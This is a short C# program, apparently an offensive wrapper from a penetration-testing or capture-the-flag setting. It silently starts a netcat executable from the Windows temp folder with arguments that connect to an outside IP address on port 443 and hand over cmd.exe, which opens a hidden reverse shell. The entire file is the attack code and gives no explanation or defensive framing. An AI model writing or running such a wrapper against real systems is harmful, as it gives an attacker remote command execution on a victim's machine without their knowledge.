using System;
using System.Diagnostics;

namespace Wrapper{
    class Program{
        static void Main(){
		Process proc = new Process();
		ProcessStartInfo procInfo = new ProcessStartInfo("c:\\windows\\temp\\nc-FutureHacker2009.exe", "10.50.83.138 443 -e cmd.exe");
		procInfo.CreateNoWindow = true;
		proc.StartInfo = procInfo;
		proc.Start();
        }
    }
}
